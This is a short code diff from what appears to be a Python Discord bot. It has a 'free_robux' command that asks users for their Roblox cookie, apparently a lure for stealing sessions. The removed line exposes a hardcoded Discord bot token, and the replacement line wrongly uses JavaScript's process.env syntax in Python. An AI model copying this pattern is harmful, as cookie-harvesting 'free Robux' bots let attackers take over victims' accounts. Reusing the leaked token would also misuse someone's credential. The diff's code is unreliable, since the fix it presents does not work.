@@ -111,4 +111,4 @@ async def free_robux(interaction: discord.Interaction, 로블록스_쿠키: str)
         # Handle the error appropriately (e.g., log it, send a message, etc.)
 
 # Token should be kept secure, not hardcoded in the script
-bot.run("MTE5NTkyMTQ2NjcxMDA0ODgzOQ.GDcNj9.0yi7PtH495TGZ4qcxPDxOM3UGSQEhC22rP3ujE")
+bot.run(process.env.TOKEN)
